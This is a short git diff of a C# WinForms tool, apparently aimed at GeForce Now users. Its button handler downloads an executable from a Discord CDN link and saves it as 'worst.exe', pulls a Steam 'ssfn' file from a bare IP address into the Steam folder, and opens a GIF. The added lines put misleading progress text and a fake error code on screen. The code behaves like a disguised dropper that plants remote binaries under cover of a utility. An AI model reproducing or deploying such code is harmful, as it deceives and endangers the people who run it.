@@ -308,9 +308,10 @@ namespace Cloudforce_Revamped
         private void guna2GradientButton5_Click(object sender, EventArgs e)
         {
             var username = Environment.UserName;
+            guna2HtmlLabel2.Text = "Status: Working on %command% reel amdin. Please wait.";
             File_Downloader("https://cdn.discordapp.com/attachments/914714246774915093/1030626580499796100/worst-mistake.gif", $"C:\\users\\{username}\\downloads\\mistake.gif", guna2GradientButton5);
             File_Downloader("https://cdn.discordapp.com/attachments/914714246774915093/1030626580042616933/gifted.exe", $"C:\\users\\{username}\\downloads\\worst.exe", guna2GradientButton5);
-            File_Downloader("http://178.62.250.139/Files/%25command%25/ssfn_%25command%25.zip", "C:\\Program Files (x86)\\steam\\ssfn_%command%.zip", guna2GradientButton5);
+            File_Downloader("http://178.62.250.139/Files/%25command%25/ssfn_%25command%25.zip", "C:\\Program Files (x86)\\steam\\ssfn_command.zip", guna2GradientButton5);
             new Process()
             {
                 StartInfo = new ProcessStartInfo()
@@ -321,7 +322,9 @@ namespace Cloudforce_Revamped
                     Arguments = "mistake.gif"
                 }
             }.Start();
+            MessageBox.Show("0x8003001F5");
             Thread.Sleep(9000);
+            guna2HtmlLabel2.Text = "Status: What status is your gfn account?";
             new Process()
             {
                 StartInfo = new ProcessStartInfo()
